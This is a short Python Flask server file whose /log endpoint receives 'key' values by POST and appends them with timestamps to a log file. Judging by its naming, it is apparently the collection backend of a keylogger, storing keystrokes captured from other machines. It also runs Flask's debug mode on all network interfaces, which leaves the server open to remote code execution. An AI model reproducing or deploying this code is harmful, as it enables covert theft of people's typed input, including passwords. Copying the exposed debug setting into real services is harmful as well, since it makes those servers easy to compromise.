from flask import Flask, request
from datetime import datetime
import os


app = Flask(__name__)

LOG_FILE = "server_log.txt"

# Ensure log file exists
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f:
        f.write("Log file created.\n")

@app.route('/log', methods=['POST'])
def log_key():
    data = request.json
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    key_data = data.get("key", "")
    
    if key_data:
        with open(LOG_FILE, "a") as f:
            f.write(f"{timestamp} - {key_data}\n")
            f.flush()  # Ensure data is written immediately
        return {"status": "success"}, 200
    
    return {"status": "error", "message": "No key data received"}, 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
 